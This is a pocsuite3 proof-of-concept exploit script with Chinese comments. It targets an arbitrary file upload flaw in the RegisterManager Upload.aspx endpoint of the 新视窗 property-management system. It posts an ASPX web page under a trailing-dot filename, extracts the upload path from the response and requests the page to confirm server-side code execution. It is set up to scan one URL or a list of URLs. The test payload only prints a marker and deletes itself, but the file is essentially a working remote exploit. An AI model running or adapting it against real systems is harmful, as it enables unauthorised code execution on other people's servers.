from collections import OrderedDict
from urllib.parse import urljoin
import re,json,time
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2024-04-09'  #漏洞公开的时间,不知道就写今天
    createDate = '2024-04-09'  # 编写 PoC 的日期
    updateDate = '2024-04-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '新视窗新一代物业管理系统RegisterManager任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '新视窗新一代物业管理系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
       新视窗新一代物业管理系统RegisterManager存在任意文件上传漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/OfficeManagement/RegisterManager/Upload.aspx"
        url = self.url + path
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryo5HTN9AzR7zKf8Zm',
        }
        data ='''------WebKitFormBoundaryo5HTN9AzR7zKf8Zm
Content-Disposition: form-data; name="file"; filename="1.aspx."
Content-Type: image/jpg

<%@Page Language="C#"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundaryo5HTN9AzR7zKf8Zm--
'''
        try:
            resq = requests.post(url=url,data=data,headers=headers,timeout=5)
            if 'WyglTest' in resq.text:
                #正则提取 获取itype值
                pattern = re.compile(u'(?<=ContractMamager)(.*)(?=.aspx.)')
                str = resq.text
                shell_path = pattern.search(str).group()
                resq_poc  = requests.get(url=self.url+'/Upload/ContractMamager'+shell_path+'.aspx',headers=headers,timeout=5)
                if 'e165421110ba03099a1c0393373c5b43' in resq_poc.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['POC'] = self.url+'/Upload/ContractMamager'+shell_path+'.aspx'           
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
